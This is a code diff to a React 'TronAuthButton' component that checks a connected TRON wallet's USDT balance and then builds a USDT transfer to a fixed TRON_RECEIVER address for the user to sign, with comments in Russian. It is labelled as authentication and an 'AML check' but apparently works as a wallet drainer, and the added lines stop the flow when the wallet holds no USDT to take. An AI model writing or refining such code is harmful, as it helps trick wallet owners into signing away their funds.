@@ -60,12 +60,20 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
+      // Проверяем USDT баланс до создания транзакции!
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
+      if (usdt < 0.000001) {
+        setModal('❌ No USDT found on this wallet for AML check.');
+        await adapter.disconnect();
+        setLoading(false);
+        return;
+      }
+
       const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
-      // Готовим транзакцию
+      // Создаём транзакцию
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -77,7 +85,7 @@ export const TronAuthButton: React.FC = () => {
         userAddress
       );
 
-      // Только ОДИН раз вызываем signTransaction
+      // Подпись транзакции (одно окно подтверждения всегда)
       const signedTx = await adapter.signTransaction(transaction);
 
       let extra = '';
